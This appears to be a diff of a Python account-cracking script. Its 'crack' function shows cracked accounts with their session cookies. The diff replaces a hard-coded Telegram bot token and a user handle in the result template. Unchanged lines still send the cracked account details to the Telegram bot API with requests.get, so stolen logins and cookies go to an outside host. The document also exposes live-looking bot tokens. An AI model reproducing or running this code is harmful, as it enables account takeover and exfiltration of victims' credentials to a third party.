@@ -361,7 +361,7 @@ p = '\x1b[0;34m' # BIRU +
 asu = random.choice([m,k,h,u,b])
 #------------[ 𝑹𝑴𝑨𝑫]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-soznop = '6751483003:AAHOMoNkoekMfsxeBNalgT2HfgQgZnEgRy8'
+soznop = '6103725322:AAETvAByJ5sXofTn2ACo46mYVYIB3w0xtFE'
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
@@ -1401,10 +1401,7 @@ def crack(idf,pwv):
 ⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : 
  {kuki}
 '''
-					touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
-𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  : 1305872197
-
- ID : tg://openmessage?user_id={ID}
+					touy8=(f'━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  6212016544\nID tg://openmessage?user_id={ID}')
  '''					
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
@@ -1481,10 +1478,7 @@ def crack(idf,pwv):
 ⚡ -  C⃨O⃨O⃨K⃨I⃨E⃨S⃨ : 
  {kuki}
 '''
-					touy8 = f'''━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━
-𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  : 1305872197
-
- ID :  tg://openmessage?user_id={ID}
+					touy8=(f'━━━━━━━━━━•❅•°•❈•°•❅•━━━━━━━━━\n𝗨𝐒𝐄𝐑 𝐇𝐀𝐍𝐃𝐒  •❅•°••°  6212016544\nID tg://openmessage?user_id={ID}')
  '''					
 					requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 					
